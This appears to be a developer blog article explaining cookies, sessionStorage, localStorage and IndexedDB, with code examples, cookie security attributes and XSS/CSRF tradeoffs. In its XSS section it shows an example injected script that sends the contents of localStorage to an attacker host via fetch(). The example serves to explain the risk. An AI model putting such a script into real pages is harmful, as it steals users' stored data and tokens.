---
title: "Cookies vs Sessions vs Local Storage: Web Storage Explained"
description: "Every website stores data on your browser — but cookies, sessions, and local storage work very differently. Learn when to use each, security risks, and real code examples."
slug: "cookies-sessions-local-storage-explained"
category: "Developer"
author: "SimpleWebToolsBox Team"
date: "2026-05-01"
readTime: "13 min read"
image: "https://images.pexels.com/photos/546819/pexels-photo-546819.jpeg"
---

## The Hidden Data Layer in Every Web Application

Every time you stay logged in after closing a browser tab, every time a website remembers your shopping cart, every time your dark mode preference persists — some form of browser storage is at work. There are multiple mechanisms available, each with distinct behavior, security characteristics, capacity, and appropriate use cases.

Developers who do not understand these differences end up storing sensitive data insecurely, creating sessions that expire at the wrong time, or building features that silently break in certain contexts. This guide provides a complete, practical explanation of every major web storage mechanism, with real code examples and clear decision criteria.

---

## Overview: The Four Storage Mechanisms

| Feature | Cookie | sessionStorage | localStorage | IndexedDB |
|---|---|---|---|---|
| Capacity | ~4 KB | ~5 MB | ~5–10 MB | Hundreds of MB |
| Sent with requests | ✅ Yes | ❌ No | ❌ No | ❌ No |
| Persistence | Configurable | Tab session | Until deleted | Until deleted |
| Accessible from JS | ✅ (unless HttpOnly) | ✅ | ✅ | ✅ |
| Accessible server-side | ✅ | ❌ | ❌ | ❌ |
| Same-origin only | Configurable | ✅ | ✅ | ✅ |

---

## Cookies: The Original Web Storage

Cookies were introduced in 1994 by Netscape, specifically for solving the stateless nature of HTTP. HTTP is stateless — the server has no memory of previous requests. Cookies gave servers a way to set a small piece of data on the client that would be sent back automatically with every subsequent request.

### How Cookies Work

A server sets a cookie by including a `Set-Cookie` header in an HTTP response:

```
Set-Cookie: session_id=abc123xyz; Path=/; Expires=Wed, 31 Dec 2026 23:59:59 GMT; HttpOnly; Secure; SameSite=Strict
```

The browser stores the cookie and sends it back automatically in the `Cookie` header of every future request to the same domain:

```
Cookie: session_id=abc123xyz
```

### Setting Cookies in JavaScript

```javascript
// Set a cookie (expires in 7 days)
const expiryDate = new Date();
expiryDate.setDate(expiryDate.getDate() + 7);
document.cookie = `theme=dark; expires=${expiryDate.toUTCString()}; path=/`;

// Read all cookies
console.log(document.cookie); // "theme=dark; other_cookie=value"

// Delete a cookie (set expiry to past date)
document.cookie = "theme=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
```

The `document.cookie` API is intentionally awkward — it does not give you a clean object with get/set methods. Many developers use a small utility function or the newer Cookie Store API.

### Cookie Attributes: The Security-Critical Ones

**`HttpOnly`** — The cookie cannot be accessed via JavaScript (`document.cookie` returns nothing for it). This protects against XSS attacks stealing the cookie. **Always set `HttpOnly` on session cookies.**

**`Secure`** — The cookie is only sent over HTTPS connections, never HTTP. **Always set on production cookies.** A cookie without `Secure` can be intercepted over an unencrypted connection.

**`SameSite`** — Controls cross-site request behavior:
- `Strict`: Cookie only sent for same-site requests. Most restrictive.
- `Lax`: Cookie sent for same-site requests and top-level navigation (clicking a link). The modern default in most browsers.
- `None`: Cookie sent for all requests, including cross-site. Requires `Secure` attribute. Use for cookies that need to work in embedded contexts (iframes, cross-site API calls).

**`SameSite=Strict` or `SameSite=Lax` protects against CSRF attacks.** A cookie with `SameSite=Strict` will not be sent if the request originates from a different domain — preventing an attacker's website from making authenticated requests on the user's behalf.

**`Expires` / `Max-Age`** — Define how long the cookie persists. Without these, the cookie is a "session cookie" that is deleted when the browser closes. With a future date, it persists until that date or until deleted.

**`Domain`** — Specifies which domain the cookie is available to. Setting `domain=.example.com` makes the cookie available to all subdomains (app.example.com, api.example.com, etc.).

**`Path`** — Restricts the cookie to requests on a specific path. `Path=/api` means the cookie is only sent for requests starting with `/api`.

### What Cookies Are Best For

- **Session tokens.** A reference to a server-side session — sent automatically with every request, invisible to JavaScript (HttpOnly), secure.
- **Authentication tokens** (access tokens, refresh tokens) when they need to be sent with API requests automatically.
- **Cross-request state** that the server needs to see. Because cookies are sent with every request, the server can read them without JavaScript being involved.

---

## sessionStorage: Tab-Scoped Temporary Data

`sessionStorage` is part of the Web Storage API introduced in HTML5. It stores key-value pairs in the browser, but only for the duration of the page session — it is cleared when the tab or browser window is closed.

```javascript
// Set
sessionStorage.setItem('checkout_step', '2');
sessionStorage.setItem('cart_data', JSON.stringify({ items: [], total: 0 }));

// Get
const step = sessionStorage.getItem('checkout_step');  // "2"
const cart = JSON.parse(sessionStorage.getItem('cart_data'));

// Remove one item
sessionStorage.removeItem('checkout_step');

// Clear everything
sessionStorage.clear();
```

### Key Behavior

- **Scoped to the tab.** Two tabs open to the same website have completely separate `sessionStorage`. This is different from cookies and `localStorage`.
- **Not sent to the server.** Unlike cookies, `sessionStorage` data never leaves the browser unless you explicitly send it via JavaScript.
- **Cleared on tab close.** There is no expiry to set — it simply disappears when the session ends.

### What sessionStorage Is Best For

- **Multi-step form data.** Store form progress as a user moves through steps. Data persists through page navigations within the tab but does not pollute other tabs or survive a browser restart.
- **Temporary UI state.** Which accordion is open, scroll position, active filter state within a single session.
- **One-time data passing between pages.** Pass data from one page to another during a navigation without URL parameters or server round-trips.

---

## localStorage: Persistent Client-Side Storage

`localStorage` uses the identical API as `sessionStorage`, but data persists indefinitely — until explicitly cleared by JavaScript or the user manually clearing browser storage.

```javascript
// Set
localStorage.setItem('user_preferences', JSON.stringify({
  theme: 'dark',
  fontSize: 'large',
  language: 'en-IN'
}));

// Get
const prefs = JSON.parse(localStorage.getItem('user_preferences'));
console.log(prefs.theme);  // "dark"

// Update one property
const current = JSON.parse(localStorage.getItem('user_preferences')) || {};
current.theme = 'light';
localStorage.setItem('user_preferences', JSON.stringify(current));

// Remove
localStorage.removeItem('user_preferences');
```

### Storage Limit and Errors

Most browsers allow 5–10 MB of `localStorage` per origin. Attempting to exceed this throws a `QuotaExceededError`. If your application writes to `localStorage` regularly (logging, caching), wrap writes in try-catch:

```javascript
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      console.warn('localStorage quota exceeded');
      // Implement cleanup logic here
    }
  }
}
```

### What localStorage Is Best For

- **User preferences** that should persist across sessions: theme, language, layout preferences.
- **Draft content.** Autosave a form or text editor so work is not lost on accidental navigation.
- **Caching API responses** for performance — store data that does not change frequently so subsequent visits load faster.
- **Feature flags and user settings** for smaller applications that do not need a backend for preferences.

### What localStorage Is NOT For

- **Authentication tokens.** `localStorage` is accessible by any JavaScript on the page. A successful XSS attack can steal tokens from `localStorage`. Session tokens should be in `HttpOnly` cookies.
- **Sensitive personal or financial data.** Same reason — XSS exposure.
- **Large datasets.** Use IndexedDB for structured data and larger amounts.

---

## The Security Comparison

### XSS (Cross-Site Scripting) Vulnerability

Both `localStorage` and `sessionStorage` are **fully accessible by JavaScript**. If an attacker can inject and execute malicious JavaScript on your page (via XSS), they can read everything in `localStorage` and `sessionStorage`.

```javascript
// An attacker's injected script can do this:
const stolenData = JSON.stringify(localStorage);
fetch('https://attacker.com/steal?data=' + btoa(stolenData));
```

An `HttpOnly` cookie **cannot** be read by JavaScript at all. It exists in the browser but is invisible to `document.cookie` and all JavaScript APIs. This is why `HttpOnly` cookies are significantly more secure for authentication tokens than any JavaScript-accessible storage.

**The rule:**
- Auth tokens → `HttpOnly` Secure cookies
- User preferences, UI state, draft content → `localStorage` or `sessionStorage` (non-sensitive)

### CSRF Vulnerability

Cookies are automatically sent with cross-origin requests (unless `SameSite` restrictions apply). This creates CSRF risk: a malicious site can trigger a request to your API, and the browser automatically includes the authentication cookie.

`localStorage` data is **not** automatically included in any requests — your code must explicitly add it. An API using `Authorization: Bearer <token>` from `localStorage` is immune to CSRF because cross-origin forms and redirects cannot access `localStorage`.

The irony: the storage most vulnerable to XSS (localStorage) is immune to CSRF. The storage most immune to XSS (HttpOnly cookies) needs `SameSite` protection against CSRF. Modern best practice combines both correctly.

---

## IndexedDB: For Complex Data Needs

When `localStorage` is insufficient — you need to store large amounts of structured data, run queries, or handle binary data like images or files — **IndexedDB** is the browser's full client-side database.

```javascript
// IndexedDB requires async operations
const request = indexedDB.open('MyDatabase', 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  db.createObjectStore('notes', { keyPath: 'id', autoIncrement: true });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  const tx = db.transaction('notes', 'readwrite');
  const store = tx.objectStore('notes');
  store.add({ title: 'My Note', content: 'Content here', created: Date.now() });
};
```

IndexedDB is more complex to use directly. Libraries like **Dexie.js** provide a much cleaner API on top of it for applications that need structured client-side storage.

---

## Decision Guide: Which Storage to Use

| What you're storing | Recommended storage |
|---|---|
| Session/auth token | `HttpOnly Secure` cookie |
| JWT access token | `HttpOnly Secure` cookie (preferred) OR `sessionStorage` |
| User preferences (theme, language) | `localStorage` |
| Multi-step form progress | `sessionStorage` |
| Shopping cart (guest user) | `localStorage` |
| Draft/autosaved content | `localStorage` |
| Analytics / tracking | Cookie (with consent) |
| Large datasets / offline data | IndexedDB |
| Temporary tab-scoped data | `sessionStorage` |
| Sensitive personal data | Never client-side — server only |

---

## Summary

- **Cookies** are sent with every HTTP request — ideal for session tokens. Use `HttpOnly`, `Secure`, and `SameSite` attributes always.
- **sessionStorage** is tab-scoped and temporary — clears on tab close. Use for single-session UI state and form progress.
- **localStorage** persists indefinitely — use for user preferences and draft data. Never for auth tokens (XSS risk).
- **IndexedDB** is a full client-side database for large structured data needs.
- The correct choice depends on: Does the server need to read it? (Cookie) Should it persist after browser close? (localStorage vs sessionStorage) Is it sensitive? (HttpOnly cookie, not JS-accessible storage)

---

## Content Tracking Log

| Title | Primary Keyword |
|---|---|
| Cookies vs Sessions vs Local Storage: Web Storage Explained | cookies localStorage sessionStorage |